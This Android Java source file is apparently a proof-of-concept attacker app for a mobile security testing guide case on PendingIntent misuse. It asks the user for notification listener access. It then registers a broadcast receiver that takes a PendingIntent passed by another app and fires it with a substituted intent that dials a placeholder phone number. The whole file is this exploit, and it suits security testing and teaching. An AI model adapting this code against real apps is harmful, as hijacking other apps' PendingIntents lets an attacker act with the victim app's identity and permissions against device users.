package com.example.exploit_mastg_test0030;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;


import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_NOTIFICATION_ACCESS = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        // Check if notification access is enabled
        if (!isNotificationServiceEnabled()) {
            // If not enabled, request permission
            requestNotificationAccess();
        } else {
            // Start the NotificationListenerService
            startNotificationListenerService();
            BroadcastReceiver myReceiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    PendingIntent pendingIntent = intent.getParcelableExtra("key");
                    String phoneNumber = "1234567890";
                    Uri phoneUri = Uri.parse("tel:" + phoneNumber);
                    Intent vunlnIntent = new Intent(Intent.ACTION_DIAL, phoneUri);
                    try {
                        pendingIntent.send(context, 2, vunlnIntent, null, null);
                    } catch (PendingIntent.CanceledException e) {
                        e.printStackTrace();
                    }

                }
            };
            registerReceiver(myReceiver, new IntentFilter("VIEW_CONTACTS"));
        }
    }

    private boolean isNotificationServiceEnabled() {
        ComponentName cn = new ComponentName(this, MyNotificationListenerService.class);
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(cn.flattenToString());
    }

    private void requestNotificationAccess() {
        Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
        startActivityForResult(intent, REQUEST_NOTIFICATION_ACCESS);
    }

    private void startNotificationListenerService() {
        Intent intent = new Intent(this, MyNotificationListenerService.class);
        startService(intent);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_NOTIFICATION_ACCESS) {
            // Check if user granted notification access
            if (isNotificationServiceEnabled()) {
                // Permission granted, start the service
                startNotificationListenerService();
            } else {
                // Permission denied, handle accordingly (e.g., show error message)
            }
        }
    }

}
